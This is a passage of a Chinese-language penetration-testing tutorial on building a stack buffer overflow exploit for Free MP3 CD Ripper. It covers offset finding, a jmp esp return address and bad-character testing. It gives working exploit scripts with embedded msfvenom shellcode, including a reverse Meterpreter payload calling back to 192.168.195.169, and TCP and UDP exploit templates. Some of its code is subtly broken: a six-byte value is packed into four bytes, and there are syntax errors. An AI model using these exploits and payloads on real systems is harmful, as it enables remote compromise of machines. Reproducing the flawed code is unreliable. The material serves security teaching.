现在您已经了解了将数据注入缓冲区并溢出的基础知识，我们可以针对一个真正易受攻击的解决方案。我们将使用 Free MP3 CD Ripper 程序作为示例。这个程序在开发利用程序方面提供了非常少的实际价值，但开发它是一个相对简单的练习。

# 编写基本缓冲区溢出利用

我们将利用 Free MP3 CD Ripper 软件程序的版本 1。为此，我们需要从以下位置下载并安装该产品[`free-mp3-cd-ripper.en.softonic.com/`](http://free-mp3-cd-ripper.en.softonic.com/)。为了利用该程序的弱点，我们将使用以下 Python 脚本，它将生成一个恶意的.wav 文件，可以上传到该程序中。数据将被解释，并将创建一个我们可以观察并尝试调整和构建利用的溢出条件。如前所述，我们将加载多种不同的字符到该文件中，以便我们可以估计存储的 EIP 值的相对位置。

```py
#!/usr/bin/env python
import struct
filename="exploit.wav"
fill ="A"*4000
fill +="B"*1000
fill +="C"*1000
exploit = fill
writeFile = open (filename, "w")
writeFile.write(exploit)
writeFile.close()
```

这个脚本将用四千个 A，一千个 B 和一千个 C 填充恶意的波形文件。现在，打开 Immunity 程序，如下所示：

![编写基本缓冲区溢出利用](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_08_15.jpg)

使用您的新 Python 脚本生成恶意的波形文件，如下所示：

![编写基本缓冲区溢出利用](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_08_16.jpg)

然后，加载具有易受攻击程序的新文件，如下所示：

![编写基本缓冲区溢出利用](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_08_17.jpg)

结果是，我们得到了一个坚实的 Bs 崩溃，如下所示，这意味着我们的 EIP 覆盖在四千到五千个字符之间。

![编写基本缓冲区溢出利用](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_08_19.jpg)

此外，我们看到 EBX、EBP、ESI 和 EDI 中都有 Bs，但 ESP 呢？我们需要找到放置我们的 shell 代码的空间，最简单的方法是使用 ESP。所以，我们将转储该寄存器的内容——您可以通过右键单击寄存器并在 Immunity 的左下角窗格中查看详细信息来执行此操作，如两个图像组件所示。

![编写基本缓冲区溢出利用](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_08_20.jpg)

正如您所看到的，我们也用 Bs 填充了 ESP。我们需要缩小可以放置我们的 shellcode 和 EIP 位置的位置，因此我们将使用 Metasploit 的`pattern_create.rb`。首先，我们需要找到 EIP，所以我们将生成五千个唯一的字符。当您使用此脚本时，您将能够注入数据，然后确定覆盖的确切位置。下图突出显示了如何生成唯一数据集。

![编写基本缓冲区溢出利用](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_08_22.jpg)

现在，将字符从输出文件中复制出来，并将它们作为新的`.wav`文件再次输入程序。当我们加载新的`.wav`文件时，我们看到程序再次崩溃，并且一个值覆盖了 EIP。

![编写基本缓冲区溢出利用](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_08_23.jpg)

我们需要复制该值，并使用它来确定我们的利用所需的实际偏移量，使用`patter_offset.rb`脚本，通过输入内存地址和我们最初请求的字符数。

![编写基本缓冲区溢出利用](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_08_24.jpg)

所以，现在我们将我们的填充变量更新为该值。我们必须验证这些垃圾数据是否会导致我们直接落在 EIP 上，以便可以被覆盖。可以执行一个测试用例来验证我们已经准确找到了 EIP，通过使用以下代码明确设置它：

```py
#!/usr/bin/env python
import struct
filename="exploit.wav"
fill ="A"*4112
eip = struct.pack('<I',0x42424242)
exploit = fill + eip
writeFile = open (filename, "w")
writeFile.write(exploit)
writeFile.close()
```

该代码的输出产生了以下结果，这意味着我们已经准确找到了 EIP 的位置：

![编写基本缓冲区溢出利用](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_08_25.jpg)

现在，记住我们在测试中验证了我们覆盖了 ESP。我们将使用 ESP 和 EIP 之间的区域来保存我们的 shellcode。因此，我们正在寻找 `jmp esp` 命令，并且我们将使用微软的共享库来实现。DLL 在每个程序周期中都会被加载和重复使用。这意味着我们可以查看程序使用的 DLL，并尝试找到一个可以用来引用 `jmp esp` 命令的内存位置。然后，我们可以用可行的 DLL 中 `jmp esp` 指令的内存位置替换 EIP 值。

如果你按下 *Alt* + *E*，你将会看到一个新窗口，其中包含了整个受影响的程序 DLL 和系统 DLL。请看下面的截图，突出显示了这些 DLL：

![编写基本缓冲区溢出利用](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_08_26.jpg)

程序和系统 DLL

双击 `kernel32.dll`，然后右键搜索特定命令：

![编写基本缓冲区溢出利用](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_08_27.jpg)

一旦我们点击命令，我们搜索操作指令集 `jmp esp`，它告诉程序跳转到 ESP。

![编写基本缓冲区溢出利用](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_08_28.jpg)

我们复制结果并获得以下信息：

```py
7C874413   FFE4             JMP ESP
```

接下来，我们将 EIP 设置为发现的地址。这个地址是一个很好的目标地址，因为没有坏字符，比如 "\x00"。这些字符实际上会阻止我们的代码完全执行。有很多方法可以测试坏字符，但有一些标准我们尽量避免。

+   空字符 ("\x00")

+   换页符 ("\xFF")

+   制表符 ("\x09")

+   换行符 ("\x0A")

+   回车符 ("\x0D")

其他字符可以通过使用潜在的坏字符列表对应用程序进行模糊测试来进行测试。你可以将这些字符集列表从 "\x00" 到 "\xFF" 注入进去。当你看到应用程序崩溃时，你已经确定了一个坏字符。删除元组中的字符，存储该值，然后再试一次。一旦通过一个坏字符执行而不崩溃，你就确定了所有可行的坏字符。在确定了剩余的堆栈空间有多大和偏移量之后，我们可以测试坏字符。

接下来是识别堆栈偏移空间。在利用脚本中将 shellcode 放在 EIP 值后面是无效的。这可能导致字符被无序读取，进而导致 shellcode 执行失败。

这是因为如果我们跳转到 ESP 而没有考虑到空隙，我们可能会偏移代码。这意味着完整的指令集将无法被整体解释。这意味着我们的代码将无法正确执行。此外，如果我们不精确并在 EIP 和 ESP 之间插入大量 NOP 数据，你可能会占用可用于 shellcode 的宝贵空间。记住，堆栈空间是有限的，所以精确是有益的。

为了测试这一点，我们可以编写一个快速生成器脚本，这样我们就不会影响我们的实际利用脚本。这个脚本帮助我们测试 EIP 和 ESP 之间的空隙。

```py
#!/usr/bin/env python
data = "A"*4112 #Junk
data += "BBBB" #EIP
data += "" #Where you place the pattern_create.rb data
open('exploit.wav', 'w').close()
with open("exploit.wav", "w") as text_file:
    text_file.write(data)
```

然后我们运行相同的 `pattern_create.rb` 脚本，但只使用 1000 个字符而不是 5000 个。将输出数据放入数据变量并运行生成器脚本。在监视程序的同时加载 `exploit.wav` 文件，就像之前一样。当程序再次崩溃时，查看 ESP 的转储。

![编写基本缓冲区溢出利用](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_08_29.jpg)

当你查看转储时，你会发现最初偏移了十个字符。这意味着为了使这段代码的执行更可靠，我们需要在 EIP 和 shellcode 之间添加十个或更多个字符的 NOP。现在，我们需要确定在堆栈的这个位置有多少空间可以注入我们的代码。我们查看我们的内存转储，并找到开始和结束地址之间的差异，以确定我们有多少空间。通过取两个地址，我们发现我们有大约 320 字节的有限空间可以使用。

如果我们正在执行单阶段有效负载，有一些步骤我们可以执行来验证我们是否会保持在范围内。然而，我们正在执行多阶段有效负载，这意味着我们需要比提供的空间更多。这意味着我们需要实时修改堆栈大小，但在那之前，我们应该确认我们可以获得代码执行，并且你需要了解堆栈空间耗尽的情况是什么样的。

现在我们知道了我们的堆栈空间和偏移量，我们可以调整脚本以搜索潜在的恶意字符。接下来，我们在代码末尾添加一个 NOP 滑梯，以确保执行 Jump to ESP 直到它触及可执行代码。我们通过计算我们可以使用的整个区域，并从中减去偏移量和 shellcode 来实现这一点。

然后我们创建一个占据剩余空间的 NOP 滑梯。执行这个最简单的方法是使用类似于这个方程的方程`nop = "\x90"*(320-len(shell)-len(offset))`。更新后的 Python 代码如下所示。使用以下 Python 脚本，我们可以测试恶意字符；请注意，我们必须在初始大小之后进行这样做，因为我们的问题区域将在剩余的堆栈空间中。

```py
#!/usr/bin/env python
import struct
filename="exploit.wav"
fill ="A"*4112
eip = struct.pack('<I',0x7C874413)
offset = "\x90"*10
available_shellcode_space = 320
characters"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e"
"\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d"
"\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c"
"\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b"
"\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a"
"\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59"
"\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68"
"\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77"
"\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86"
"\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95"
"\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4"
"\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3"
"\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2"
"\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1"
"\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef"
"\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe"
"\xff")
nop = "\x90"*(available_shellcode_space-len(shell)-len(offset))
exploit = fill + eip + offset + shell + nop
open('exploit.wav', 'w').close()
writeFile = open (filename, "w")
writeFile.write(exploit)
writeFile.close()
```

我们应该生成我们的模拟 shellcode，程序将跳转到这里。对于一个初始测试案例，你希望从一个简单的例子开始，它不会有任何其他依赖关系。所以，我们可以告诉注入的代码调用一个`calc.exe`的实例。要做到这一点，我们只需要使用`msfvenom`来生成 shellcode。

```py
msfvenom -p windows/exec CMD=calc.exe -f c -b '\x00\xff'

```

这样做的目的是生成可以放置在 Python 元组中的 shellcode，并删除潜在的恶意字符`'\x00'`，`'\xff'`。像`msfvenom`这样的工具会自动使用编码器来完成这项工作。编码器的目的是删除恶意字符；有一个很大的误解，即它们用于绕过像防病毒软件这样的 HIPS。

多年前，在 HIPS 中进行基本的签名分析可能没有捕获到利用程序，因为它没有匹配一个非常具体的签名。今天，安全工具开发人员已经变得更加优秀，触发器更具分析性。因此，编码器帮助阻止 HIPS 解决方案捕获利用程序的谬论最终正在消失。

![编写基本的缓冲区溢出利用程序](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_08_30.jpg)

我们的新利用程序与`calc.exe`代码如下所示：

```py
#!/usr/bin/env python
import struct
filename="exploit.wav"
fill ="A"*4112
eip = struct.pack('<I',0x7C874413)
offset = "\x90"*10
available_shellcode_space = 320
shell =("\xda\xd3\xd9\x74\x24\xf4\xb8\x2c\xde\xc4\x11\x5a\x29\xc9\xb1"
"\x31\x31\x42\x18\x03\x42\x18\x83\xea\xd0\x3c\x31\xed\xc0\x43"
"\xba\x0e\x10\x24\x32\xeb\x21\x64\x20\x7f\x11\x54\x22\x2d\x9d"
"\x1f\x66\xc6\x16\x6d\xaf\xe9\x9f\xd8\x89\xc4\x20\x70\xe9\x47"
"\xa2\x8b\x3e\xa8\x9b\x43\x33\xa9\xdc\xbe\xbe\xfb\xb5\xb5\x6d"
"\xec\xb2\x80\xad\x87\x88\x05\xb6\x74\x58\x27\x97\x2a\xd3\x7e"
"\x37\xcc\x30\x0b\x7e\xd6\x55\x36\xc8\x6d\xad\xcc\xcb\xa7\xfc"
"\x2d\x67\x86\x31\xdc\x79\xce\xf5\x3f\x0c\x26\x06\xbd\x17\xfd"
"\x75\x19\x9d\xe6\xdd\xea\x05\xc3\xdc\x3f\xd3\x80\xd2\xf4\x97"
"\xcf\xf6\x0b\x7b\x64\x02\x87\x7a\xab\x83\xd3\x58\x6f\xc8\x80"
"\xc1\x36\xb4\x67\xfd\x29\x17\xd7\x5b\x21\xb5\x0c\xd6\x68\xd3"
"\xd3\x64\x17\x91\xd4\x76\x18\x85\xbc\x47\x93\x4a\xba\x57\x76"
"\x2f\x34\x12\xdb\x19\xdd\xfb\x89\x18\x80\xfb\x67\x5e\xbd\x7f"
"\x82\x1e\x3a\x9f\xe7\x1b\x06\x27\x1b\x51\x17\xc2\x1b\xc6\x18"
"\xc7\x7f\x89\x8a\x8b\x51\x2c\x2b\x29\xae")
nop = "\x90"*(available_shellcode_space-len(shell)-len(offset))
exploit = fill + eip + offset + shell + nop
open('exploit.wav', 'w').close()
writeFile = open (filename, "w")
writeFile.write(exploit)
writeFile.close()
```

然后我们运行代码生成新的恶意`.wav`文件，然后将其加载到程序中，看看 EIP 是否被覆盖，并且`calc.exe`二进制文件是否被执行。

![编写基本的缓冲区溢出利用程序](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_08_31.jpg)

现在基本的利用程序已经编写好了，我们可以更新它以通过这个弱点建立一个会话 shell。首先，我们需要确定对我们的利用程序来说最合适的有效负载大小。总的来说，这个堆栈空间是有限的，所以我们可以尝试最小化我们的足迹，但正如你将看到的那样，这并不重要。

你可以通过猜测和使用`msfvenom`和`-s`标志来生成你的有效负载，但这是低效和缓慢的。你会发现，随着有效负载的生成，它们可能根据你选择的有效负载类型和需要删除恶意字符和调整包大小的编码器而不兼容。

不要玩猜谜游戏，我们可以通过在`/usr/share/metasploit-framework/tools`目录中运行`payload_lengths.rb`脚本来确定一个好的起点。这些脚本提供了有关有效负载长度的详细信息，但请考虑我们正在寻找可能小于 300 个字符的小有效负载。因此，我们可以运行 awk 脚本来查找有效负载的大小，并使用 grep 来查找在 Windows 环境中使用的有效负载，如下所示：

![编写基本的缓冲区溢出利用](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_08_32.jpg)

这些命令的输出结果只有不到 40 个，但一些好的选项包括以下内容：

![编写基本的缓冲区溢出利用](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_08_33.jpg)

在我们的 Metasploit 实例上，我们启动`exploit/multi/handler`，它将接收 shell。

![编写基本的缓冲区溢出利用](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_08_34.jpg)

然后，我们生成我们的新 shell 代码`windows/meterpreter/reverse_nonx_tcp`，并用它替换我们的计算器代码。我们选择这种有效负载类型，因为它是一个非常小的 Meterpreter，这意味着由于我们知道我们的内存占用可能受限，我们有更好的机会成功利用这个漏洞。

```py
msfvenom -p windows/meterpreter/reverse_nonx_tcp lhost=192.168.195.169 lport=443 -f c -b '\x00\xff\x01\x09\x0a\x0d'
```

### 提示

这些例子中列出了额外的坏字符。出于习惯，我通常在生成有效负载时将这些字符保留下来。请记住，您拥有的坏字符越多，编码器就必须添加执行功能等效操作的操作越多。这意味着随着您的编码越多，您的有效负载通常会变得更大。

命令的输出如下，只有 204 字节的大小：

![编写基本的缓冲区溢出利用](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_08_35.jpg)

放置在利用代码中，我们得到以下 Python 利用程序：

```py
#!/usr/bin/env python
import struct
filename="exploit.wav"
fill ="A"*4112
eip = struct.pack('<I',0x7C874413)
offset = "\x90"*10
available_shellcode_space = 320
shell =("\xba\x16\xdf\x1b\x5d\xd9\xf6\xd9\x74\x24\xf4\x5e\x31\xc9\xb1"
"\x2d\x31\x56\x13\x83\xc6\x04\x03\x56\x19\x3d\xee\xa1\x4f\x2a"
"\x56\xb2\x76\x53\xa6\xbd\xe8\x9d\x82\xc9\x95\xe1\xbf\xb2\x58"
"\x62\xc1\xa5\x29\xc5\xe1\x38\xc7\x61\xd5\xa0\x16\x98\x27\x15"
"\x81\xc8\x89\x5f\xbc\x11\xc8\xe4\x7e\x64\x3a\xa7\x18\xbe\x08"
"\x5d\x07\x8b\x07\xd1\xe3\x0d\xf1\x88\x60\x11\x58\xde\x39\x36"
"\x5b\x09\xc6\x6a\xc2\x40\xa4\x56\xe8\x33\xcb\x77\x21\x6f\x57"
"\xf3\x01\xbf\x1c\x43\x8a\x34\x52\x58\x3f\xc1\xfa\x68\x61\xb0"
"\xa9\x0e\xf5\x0f\x7f\xa7\x72\x03\x4d\x68\x29\x85\x08\xe4\xb1"
"\xb6\xbc\x9c\x61\x1a\x13\xcc\xc6\xcf\xd0\xa1\x41\x08\xb0\xc4"
"\xbd\xdf\x3e\x90\x12\x86\x87\xf9\x4a\xb9\x21\x63\xcc\xee\xa2"
"\x93\xf8\x78\x54\xac\xad\x44\x0d\x4a\xc6\x4b\xf6\xf5\x45\xc5"
"\xeb\x90\x79\x86\xbc\x02\xc3\x7f\x47\x34\xe5\xd0\xf3\xc6\x5a"
"\x82\xac\x85\x3c\x9d\x92\x12\x3e\x3b")
nop = "\x90"*(available_shellcode_space-len(shell)-len(offset))
exploit = fill + eip + offset + shell + nop
open('exploit.wav', 'w').close()
writeFile = open (filename, "w")
writeFile.write(exploit)
writeFile.close()
```

执行时，我们得到以下结果，显示利用程序生成了一个 shell：

![编写基本的缓冲区溢出利用](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_08_36.jpg)

现在，这个例子很简单，它可能为系统提供一个本地利用，但有一个问题，我们的利用失败了，因为空间不够。如前所述，我们必须调整我们放置 shell 代码的区域。

# 理解堆栈调整

我们表明代码执行在中间利用失败，因为我们的第二阶段在内存中破坏了我们的第一阶段代码。因此，我们需要更多的堆栈空间来完成这个利用。如果必要的话，我们可以在内存中分割我们的代码，或者我们可以简单地扩展堆栈中的空间。

这是通过告诉系统向 ESP 添加空间来完成的。您可以通过两种方式之一来实现这一点：通过添加负空间或减去正空间。这是因为堆栈从高地址向低地址增长，正如我们之前提到的那样。

![理解堆栈调整](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_08_37.jpg)

因此，我们看到我们正在利用中破坏 shellcode，所以我们可以通过告诉 ESP 移动来补偿必要的空间。

![理解堆栈调整](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_08_38.jpg)

为此，我们需要在 shellcode 的前面添加一个十六进制调整。我们将以两种不同的方式来做这件事。我们将在本节中重点介绍第一种方式。然后，我们将解释第二种方式，即反向 Metasploit 有效负载。首先，我们需要弄清楚如何调整实际的堆栈；我们可以使用`/usr/share/metasploit-framework/tools/nasm_shell.rb`中的`nasm_shell.rb`来做到这一点。

80,000 的堆栈调整意味着我们将这个值添加到 ESP。为此，我们需要计算 80,000 的 ESP 调整，但为了进行这个计算，我们需要将 80,000 转换为十六进制值。十六进制等价值为 13880。

![理解堆栈调整](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_08_39.jpg)

### 提示

您可以使用内置的 Windows 计算器在科学模式下从十进制转换为十六进制，反之亦然。

这意味着我们在我们的漏洞利用中添加以下代码来调整堆栈`adjustment = struct.pack('<I',0x81EC80380100)`。然后，我们在 shellcode 之前添加调整值`exploit = fill + eip + offset + adjustment + shell`。最后，我们移除我们的 NOP sled，因为这不是填充我们的次级阶段将包含的空间，最终的代码将类似于这样。

```py
#!/usr/bin/env python
import struct
filename="exploit.wav"
fill ="A"*4112
eip = struct.pack('<I',0x7C874413)
offset = "\x90"*10
available_shellcode_space = 320
adjustment = struct.pack('<I',0x81EC80380100)
shell =("\xba\x16\xdf\x1b\x5d\xd9\xf6\xd9\x74\x24\xf4\x5e\x31\xc9\xb1"
"\x2d\x31\x56\x13\x83\xc6\x04\x03\x56\x19\x3d\xee\xa1\x4f\x2a"
"\x56\xb2\x76\x53\xa6\xbd\xe8\x9d\x82\xc9\x95\xe1\xbf\xb2\x58"
"\x62\xc1\xa5\x29\xc5\xe1\x38\xc7\x61\xd5\xa0\x16\x98\x27\x15"
"\x81\xc8\x89\x5f\xbc\x11\xc8\xe4\x7e\x64\x3a\xa7\x18\xbe\x08"
"\x5d\x07\x8b\x07\xd1\xe3\x0d\xf1\x88\x60\x11\x58\xde\x39\x36"
"\x5b\x09\xc6\x6a\xc2\x40\xa4\x56\xe8\x33\xcb\x77\x21\x6f\x57"
"\xf3\x01\xbf\x1c\x43\x8a\x34\x52\x58\x3f\xc1\xfa\x68\x61\xb0"
"\xa9\x0e\xf5\x0f\x7f\xa7\x72\x03\x4d\x68\x29\x85\x08\xe4\xb1"
"\xb6\xbc\x9c\x61\x1a\x13\xcc\xc6\xcf\xd0\xa1\x41\x08\xb0\xc4"
"\xbd\xdf\x3e\x90\x12\x86\x87\xf9\x4a\xb9\x21\x63\xcc\xee\xa2"
"\x93\xf8\x78\x54\xac\xad\x44\x0d\x4a\xc6\x4b\xf6\xf5\x45\xc5"
"\xeb\x90\x79\x86\xbc\x02\xc3\x7f\x47\x34\xe5\xd0\xf3\xc6\x5a"
"\x82\xac\x85\x3c\x9d\x92\x12\x3e\x3b")
exploit = fill + eip + offset +adjustment + shell
open('exploit.wav', 'w').close()
writeFile = open (filename, "w")
writeFile.write(exploit)
writeFile.close()
```

然而，这种方法存在一个问题。如果您的堆栈调整中有坏字符，您需要通过编码来消除这些字符。由于您通常不会在以后修改您的堆栈调整，您可以将其作为您的 shell 的一部分，并对整个代码块进行编码。当我们反向一个 Metasploit 模块时，我们将通过这个过程。

### 提示

确保在你的代码中添加关于你的堆栈调整的注释；否则，当你尝试扩展这个漏洞利用或使用其他有效负载时，你会非常沮丧。

作为一个附带的好处，如果我们使用这种方法而不是使用 NOP sleds，那么漏洞利用不太可能被 HIPS 捕捉到。现在我们已经做了所有这些，意识到有一种更简单的方法可以使用标准有效负载来获得访问权限。

### 提示

如果你仍然需要 NOPs 来进行真正的漏洞利用，确保使用 Metasploit 提供给你的 NOP 生成器。代码不使用"\x90"指令，而是进行无意义的数学运算。这些操作占用了堆栈空间，并提供了相同的功能。

# 理解本地利用的目的

值得注意的是，通过在系统上执行有效负载可以实现相同的访问权限。生成这样的有效负载只需要我们运行以下命令：

```py
msfvenom -p windows/meterpreter/reverse_nonx_tcp lhost=192.168.195.169 lport=443 -b '\x00' -f exe -o /tmp/exploit.exe

```

然后，使用以下命令启动 Python Web 服务器：

```py
python -m SimpleHTTPServer

```

以下图表突出了相关命令的输出：

![理解本地利用的目的](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_08_40.jpg)

然后，通过浏览器在受害者系统上下载并执行有效负载来实现期望的结果。

![理解本地利用的目的](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_08_41.jpg)

因此，您可能会问自己，那我们为什么要创建这个漏洞利用呢？如果我们刚刚为其创建漏洞利用的软件是以管理员身份而不是我们登录的用户身份运行的，那么利用这个解决方案将更有用。然而，尽管这种情况在这个程序的性质中是不太可能的。因此，为这种漏洞生成 Metasploit 模块将不会很有用。相反，考虑到这一点，这个练习是写你的第一个漏洞利用的绝佳机会。

在编写漏洞利用时还有另一个考虑因素，那就是根据程序的不同，您的漏洞利用可能不太可靠。这意味着由于代码的细微差别，您的漏洞利用可能会时而有效，时而无效。因此，在真实组织中执行之前，您将不得不在实验环境中进行实质性的测试。

# 理解其他漏洞利用脚本

除了编写可以上传到程序中的恶意文件之外，您可能还需要生成与服务交互的代码，这些服务可以是接受参数的独立程序、TCP 服务，甚至是 UDP 服务。考虑我们刚刚利用的上一个程序，如果它的性质不同，我们仍然可以利用它，只是脚本与它交互的方式会有所不同。以下三个示例展示了如果满足这些条件，代码会是什么样子。当然，内存地址和大小必须根据您可能遇到的其他程序进行调整。

## 通过执行脚本利用独立的二进制文件

我们甚至可以创建 Python 脚本来包装需要传递参数的程序。这样，您可以使用包装脚本构建漏洞利用，这些脚本注入代码，如下所示：

```py
import subprocess, strut
program_name = 'C:\exploit_writing\vulnerable.exe'
fill ="A"*4112
eip = struct.pack('<I',0x7C874413)
offset = "\x90"*10
available_shellcode_space = 320
shell =() #Code to insert
remaining space
exploit = fill + eip + offset + shell
subprocess.call([program_name, exploit])
```

这种形式的利用是你可能会遇到的最罕见的，因为通常不会授予你任何额外的权限。创建这类利用时，通常是为了查看通过白名单程序与用户级权限相比可能被授予的额外访问权限。请记住，这种类型的利用比恶意文件、TCP 或 UDP 服务更难编写。在另一方面，你可能会编写的最常见的利用是 TCP 服务利用。

## 通过 TCP 服务利用系统

通常情况下，你会发现可以通过 TCP 进行利用的服务。这意味着，为了进行分析，你需要设置一个测试盒，其中安装了 Immunity 或其他调试器以及正在运行的服务。你需要将 Immunity 连接到该服务并测试你之前所做的利用。

```py
import sys, socket, strut
rhost = "192.168.195.159"
lhost = "192.168.195.169"
rport = 23
fill ="A"*4112
eip = struct.pack('<I',0x7C874413)
offset = "\x90"*10
shell =() #Code to insert
# NOPs to fill the remaining space
exploit = fill + eip + offset + shell
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.sendto(exploit, (rhost, rport))
```

如果第七章中突出显示的 TFTP 服务容易受到潜在的缓冲区溢出攻击，我们将考虑为 UDP 服务创建一个利用。

## 通过 UDP 服务利用系统

生成 UDP 服务的利用与 TCP 服务非常相似。唯一的区别是你正在使用不同的通信协议。

```py
import sys, socket, strut
rhost = "192.168.195.159"
lhost = "192.168.195.169"
rport = 69
fill ="A"*4112
eip = struct.pack('<I',0x7C874413)
offset = "\x90"*10
available_shellcode_space = 320
shell =() #Code to insert
# NOPs to fill the remaining space
exploit = fill + eip + offset + shell
client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
client.sendto(exploit, (rhost, rport))
```

现在你已经了解了你可能编写的最常见类型的利用的基础知识，让我们来看一下如何反向操作 Metasploit 模块。

# 反向操作 Metasploit 模块

很多时候，你可能会发现一个服务是可利用的，但 Metasploit 模块并没有构建用于利用该服务版本或特定操作系统版本的功能。这并不罕见，只需回想一下之前编写利用的情况。根据可能已被引用的 DLL，该模块可能没有针对特定操作系统进行更新。此外，如果新版本的操作系统发布，而程序或服务仍然可行，你可能需要扩展该模块。

回想一下第五章中的*用 Python 利用服务*，以及我们如何进行研究以查找内核是否存在漏洞。考虑进行类似研究可能会导致对潜在缓冲区溢出漏洞的引用。你可以从头开始，也可以将 Metasploit 模块反向操作为一个独立的 Python 脚本，并轻松测试扩展功能。然后，你可以将更改合并到 Metasploit 模块中，甚至创建你自己的模块。

我们将对 Sami FTP Server 2.0.1 的 Metasploit 模块进行反向操作，从概念上来说，实际上是。为了简洁起见，我们不会展示整个利用代码，但你可以在 Metasploit 的安装目录下的`/usr/share/metasploit-framework/modules/exploits/windows/ftp`中查看。关于这个模块的更多细节可以在这里找到：[`www.rapid7.com/db/modules/exploit/windows/ftp/sami_ftpd_list`](http://www.rapid7.com/db/modules/exploit/windows/ftp/sami_ftpd_list)。

反向操作 Metasploit 模块时的第一件事是设置实际的利用。这将揭示需要设置的用于利用实际服务的必要参数。正如你所看到的，我们需要用户名、密码和相关有效载荷。

![反向操作 Metasploit 模块](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_08_42.jpg)

接下来，我们将看一下实际的有效载荷；我发现将其复制到像 Notepad++这样的代码编辑器中会更容易。这样可以让你看到通常需要哪些括号和分隔符。与以前编写利用的示例不同，我们将从实际的 shellcode 开始，因为这将需要最大的努力。因此，看一下实际 Metasploit 模块的有效载荷部分。

![反向操作 Metasploit 模块](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_08_43.jpg)

如您所见，堆栈调整为 3500，以更准确地容纳 shellcode 的放置。您可以再次使用上面突出显示的相同方法进行计算。在较新的 Metasploit 模块中，您将看到`PrependEncoder`而不是`StackAdjustment`，带有加号或减号的值。因此，作为模块开发人员，您不必实际计算十六进制代码。

堆栈调整为`-3500`意味着我们将这个值添加到 ESP。为此，我们需要计算`-3500`的 ESP 调整，但是为了进行这个计算，我们需要将`-3500`改为十六进制值。十六进制等价值为`-0xDAC`。

![逆向 Metasploit 模块](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_08_44.jpg)

现在，我们将调整数据打印成十六进制文件。

![逆向 Metasploit 模块](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_08_45.jpg)

正如您在模块的有效负载部分看到的，有已知的不良字符。当我们生成初始有效负载时，我们将这些字符纳入到有效负载生成中。现在，我们使用这些特性生成有效负载。

```py
